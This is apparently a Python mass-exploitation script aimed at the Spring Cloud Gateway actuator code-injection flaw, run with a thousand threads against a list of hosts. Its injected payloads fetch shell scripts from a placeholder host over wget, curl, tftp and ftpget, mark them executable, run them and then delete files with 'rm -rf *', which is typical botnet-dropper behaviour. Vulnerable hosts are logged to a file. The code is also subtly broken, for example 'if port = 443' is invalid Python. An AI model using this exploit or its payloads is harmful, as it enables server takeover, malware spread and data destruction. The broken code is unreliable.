#!/usr/bin/python3

import requests
import sys
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor
import  json
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import re


def rce(host,port):
    
    host = host.strip()
    
    url = host
    
    if port = 443:
        url = "https://" + url +":443"
    elif port = 80
        url = "http://" + url +":80"
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Connection': 'close',
        'Content-Type': 'application/json'
    }
    data1 = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '0'
    }
    data3 = '''{
        "id": "WeianSec",
        "filters": [{
            "name": "AddResponseHeader",
            "args": {"name": "Result",
                     "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://xx/0x83911d24Fx.sh; curl -O http://xx/0x83911d24Fx.sh; chmod 777 0x83911d24Fx.sh; sh 0x83911d24Fx.sh; tftp xx -c get 0xt984767.sh; chmod 777 0xft6426467.sh; sh 0xft6426467.sh; tftp -r 0xtf2984767.sh -g xx; chmod 777 0xtf2984767.sh; sh 0xtf2984767.sh; ftpget -v -u anonymous -p anonymous -P 21 xx 0xft6426467.sh 0xft6426467.sh; sh 0xft6426467.sh; rm -rf 0xt984767.sh 0xtf2984767.sh 0xft6426467.sh; rm -rf *\\"}).getInputStream()))}"}
    }],
    "uri": "http://example.com",
    "order": 0
    }'''
    data2 = {

        "id": "WeianSec",
        "filters": [{
            "name": "AddResponseHeader",
            "args": {
                "name": "Result",
                "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://xx/0x83911d24Fx.sh; curl -O http://xx/0x83911d24Fx.sh; chmod 777 0x83911d24Fx.sh; sh 0x83911d24Fx.sh; tftp xx -c get 0xt984767.sh; chmod 777 0xft6426467.sh; sh 0xft6426467.sh; tftp -r 0xtf2984767.sh -g xx; chmod 777 0xtf2984767.sh; sh 0xtf2984767.sh; ftpget -v -u anonymous -p anonymous -P 21 xx 0xft6426467.sh 0xft6426467.sh; sh 0xft6426467.sh; rm -rf 0xt984767.sh 0xtf2984767.sh 0xft6426467.sh; rm -rf *\"}).getInputStream()))}"
            }
        }],
        "uri": "http://example.com"
    }
    data = 'ewogICJpZCI6ICJXZWlhblNlYyIsCiAgImZpbHRlcnMiOiBbewogICAgIm5hbWUiOiAiQWRkUmVzcG9uc2VIZWFkZXIiLAogICAgImFyZ3MiOiB7CiAgICAgICJuYW1lIjogIlJlc3VsdCIsCiAgICAgICJ2YWx1ZSI6ICIje25ldyBTdHJpbmcoVChvcmcuc3ByaW5nZnJhbWV3b3JrLnV0aWwuU3RyZWFtVXRpbHMpLmNvcHlUb0J5dGVBcnJheShUKGphdmEubGFuZy5SdW50aW1lKS5nZXRSdW50aW1lKCkuZXhlYyhuZXcgU3RyaW5nW117XCJDbWRcIn0pLmdldElucHV0U3RyZWFtKCkpKX0iCiAgICB9CiAgfV0sCiAgInVyaSI6ICJodHRwOi8vZXhhbXBsZS5jb20iCn0='
    try:
        requests.post(url=url + "/actuator/gateway/routes/WeianSec", headers=headers, data=base64.b64decode(data),verify=False, timeout=5)
        requests.post(url=url + "/actuator/gateway/refresh", headers=headers, data=data1, verify=False, timeout=5)
        requests.post(url=url + "/actuator/gateway/refresh", headers=headers, data=data2, verify=False, timeout=5)
        requests.post(url=url + "/actuator/gateway/refresh", headers=headers, data=data3, verify=False, timeout=5)
        r = requests.get(url=url + "/actuator/gateway/routes/WeianSec", headers=headers, verify=False, timeout=5)
        if r.status_code == 200:
            print(r.text)
            with open('checked.txt',"a") as a:  
                str = a.write(url + "\n")
    except:
        pass
if __name__ == '__main__':
    port = int(sys.argv[2])
    with ThreadPoolExecutor(max_workers=1000) as pool:
        with open(sys.argv[1], 'r') as f:
            task = [pool.submit(rce, url,port) for url in f.readlines()]
